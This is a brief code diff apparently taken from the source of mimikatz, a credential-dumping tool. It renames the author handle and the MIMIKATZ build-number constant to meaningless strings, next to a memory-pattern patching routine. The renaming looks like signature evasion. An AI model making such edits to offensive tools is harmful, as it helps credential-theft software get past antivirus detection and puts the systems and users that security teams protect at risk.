@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kull_m_patch.h"
@@ -86,7 +86,7 @@ BOOL kull_m_patch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generic
 
 	PKULL_M_PATCH_GENERIC currenReferences;
 
-	if(currenReferences = kull_m_patch_getGenericFromBuild(generics, cbGenerics, MIMIKATZ_NT_BUILD_NUMBER))
+	if(currenReferences = kull_m_patch_getGenericFromBuild(generics, cbGenerics, EARDOGZ_NT_BUILD_NUMBER))
 	{
 		aPatternMemory.address = currenReferences->Search.Pattern;
 		aPatchMemory.address = currenReferences->Patch.Pattern;
